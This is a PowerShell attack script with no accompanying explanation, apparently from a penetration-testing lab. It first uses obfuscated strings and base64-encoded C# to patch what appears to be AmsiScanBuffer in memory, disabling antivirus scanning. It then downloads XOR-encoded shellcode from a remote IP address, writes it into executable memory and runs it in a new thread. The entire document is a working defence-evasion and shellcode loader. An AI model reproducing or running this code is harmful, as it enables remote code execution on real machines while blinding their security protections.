${11} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQB
zAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIA
bABpAGMAIABjAGwAYQBzAHMAIABMAEQAVQBDAFMAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsA
DMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQ
B0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4
AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABw
AHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAd
AByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA
0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgB
vAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUA
aQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0A
CkAOwANAAoAfQA=')))
Add-Type ${11}
${10} = [LDUCS]::LoadLibrary("$([chAR](139-42)+[CHar](109)+[cHAr](47+68)+[CHaR]([byte]0x69)+[char](68-
22)+[cHAR]([ByTe]0x64)+[CHaR](108)+[char]([bytE]0x6C))")
${1} = [LDUCS]::GetProcAddress(${10},
"$($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('wwBtAHMA7gBTAGMA4gBuAEIAdQBmAGYAZQByAA==
'))).NoRMALizE([chaR]([ByTe]0x46)+[ChAR](42+69)+[chaR](15+99)+[chAr](109)+[CHaR](90-22)) -replace
[CHar]([bYTE]0x5C)+[ChAr]([BYte]0x70)+[char]([byTe]0x7B)+[chAR](77)+[CHAr](135-25)+[CHaR](206-81))")
${9} = 0
[LDUCS]::VirtualProtect(${1}, [uint32]5, 0x40, [ref]${9})
${8} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AEIAOAA=')))
${7} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADUANwA=')))
${6} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAA=')))
${5} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAANwA=')))
${4} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADgAMAA=')))
${3} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AEMAMwA=')))
${2} = [Byte[]] (${8},${7},${6},${5},+${4},+${3})
[System.Runtime.InteropServices.Marshal]::Copy(${2}, 0, ${1}, 6)

function LookupFunc {
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
	Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp=@()
	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
	@($moduleName)), $functionName))
}

function getDelegateType {
	Param (
	[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
	[Parameter(Position = 1)] [Type] $delType = [Void]
	)
	$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
	$type.DefineConstructor('RTSpecialName, HideBySig, Public',	[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
	$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
	return $type.CreateType()
}
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType ([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = [System.Convert]::FromBase64String((New-Object Net.WebClient).downloadstring('http://192.168.49.117/shellcode.b64'))
$key="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
for ($i = 0; $i -lt $buf.length; $i++) {
    $buf[$i] = $buf[$i] -bxor $key[$i % $key.Length];
} 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
